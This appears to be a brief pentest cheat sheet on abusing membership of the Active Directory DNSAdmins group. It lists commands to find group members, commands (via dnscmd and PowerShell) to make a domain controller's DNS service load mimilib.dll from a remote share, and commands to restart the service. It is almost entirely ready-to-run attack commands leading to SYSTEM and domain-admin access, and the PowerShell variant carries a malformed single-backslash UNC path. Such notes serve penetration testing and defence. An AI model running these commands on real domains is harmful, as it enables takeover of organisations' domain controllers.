#powershell #dnscmd #sc 
- DNSAdmins group member can load arbitrary DLLs with the privilege of the process called dns.exe. dns.exe runs as SYSTEM.
- If domain controlles in also running a DNS server, it can be abused to gain domain admin.
# Enumeration
- Powerview
```powershell
Get-NetGroupMember -GroupName "DNSAdmins"
```
- Active Directory Module
```powershell
Get-ADGroupMember -Identity DNSAdmins
```
# Exploitation
- Once, a member of this group is compromised, dnscmd.exe can be used (from RSAT DNS) to load the DLL.
```powershell
dnscmd <dc> /config /serverlevelplugindll \\172.16.50.100\dll\mimilib.dll
```
- Using powershell to do the same (also requires RSAT DNS)
```powershell
$dnsettings = Get-DnsServerSetting -ComputerName <dc-name> -Verbose -All
$dnsettings.ServerLevelPluginDll = "\172.50.50.100\dll\mimilib.dll"
Set-DnsServerSetting -InputObject $dnsettings -ComputerName <dc> -Verbose
```
- Restart the DNS server
```powershell
sc \\<dc> stop dns
sc \\<dc> start dns
```